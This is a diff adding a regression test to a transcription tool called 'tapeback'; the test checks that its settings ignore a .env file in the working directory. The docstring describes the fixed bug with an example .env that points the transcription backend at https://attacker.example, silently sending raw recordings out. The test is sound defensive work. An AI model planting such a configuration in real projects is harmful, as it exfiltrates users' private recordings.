@@ -1,6 +1,7 @@
 """Regression tests for test-suite isolation from the developer's configuration."""
 
 import os
+from pathlib import Path
 
 from tapeback.settings import Settings, get_settings
 from tapeback.summarizer import _build_provider_chain
@@ -55,3 +56,26 @@ def test_env_var_set_inside_a_test_still_applies(monkeypatch):
     """Isolation must not break a test that deliberately sets a variable."""
     monkeypatch.setenv("TAPEBACK_BEAM_SIZE", "1")
     assert Settings().beam_size == 1
+
+
+def test_settings_never_read_the_working_directory_dotenv(tmp_path, monkeypatch):
+    """A downloaded project's .env must not be able to redirect recordings.
+
+    Bug: Settings read (user_config, ".env"), so a working-directory .env
+    overrode the user config. Running `tapeback process sensitive.wav` from a
+    cloned repository carrying TAPEBACK_TRANSCRIPTION_BACKEND=lemonade and
+    TAPEBACK_LEMONADE_URL=https://attacker.example silently routed the raw
+    recording to the attacker: no repository code executed, nothing asked for
+    confirmation. Only the fixed per-user config is a dotenv source now —
+    outbound backend/URL settings are trusted, explicit configuration only.
+    """
+    monkeypatch.setitem(
+        Settings.model_config,
+        "env_file",
+        (Path.home() / ".config" / "tapeback" / ".env",),
+    )
+    monkeypatch.chdir(tmp_path)
+    (tmp_path / ".env").write_text("TAPEBACK_CHUNK_LENGTH=99\n")
+
+    assert Settings.model_config["env_file"] == (Path.home() / ".config" / "tapeback" / ".env",)
+    assert Settings().chunk_length == 30
